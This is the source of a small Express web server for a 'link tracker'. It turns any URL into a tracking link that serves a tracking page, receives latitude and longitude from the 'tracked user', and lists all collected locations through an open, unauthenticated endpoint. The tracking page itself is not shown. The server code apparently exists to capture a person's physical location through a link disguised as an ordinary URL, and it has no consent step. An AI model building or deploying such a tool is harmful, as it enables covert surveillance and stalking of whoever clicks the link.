const express = require('express');
const path = require('path');
const app = express();
const port = 3000;

// In-memory storage for tracked locations
const locations = [];

// Middleware to parse JSON bodies
app.use(express.json());

// Serve static files from public directory
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to generate tracking link (for demonstration, just returns a URL)
app.post('/api/generate-link', (req, res) => {
  const { originalUrl } = req.body;
  if (!originalUrl) {
    return res.status(400).json({ error: 'originalUrl is required' });
  }
  // For simplicity, tracking link points to /track with originalUrl as query param
  const trackingLink = `${req.protocol}://${req.get('host')}/track?redirect=${encodeURIComponent(originalUrl)}`;
  res.json({ trackingLink });
});

// Endpoint to receive location data from tracked user
app.post('/api/track-location', (req, res) => {
  const { latitude, longitude, timestamp } = req.body;
  if (typeof latitude !== 'number' || typeof longitude !== 'number') {
    return res.status(400).json({ error: 'Invalid location data' });
  }
  locations.push({ latitude, longitude, timestamp: timestamp || Date.now() });
  res.json({ status: 'Location received' });
});

// Endpoint to get all tracked locations
app.get('/api/locations', (req, res) => {
  res.json(locations);
});

// Serve the tracking page
app.get('/track', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

// Serve the main page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve the locations display page
app.get('/locations', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'locations.html'));
});

app.listen(port, () => {
  console.log(`Link tracker app listening at http://localhost:${port}`);
});
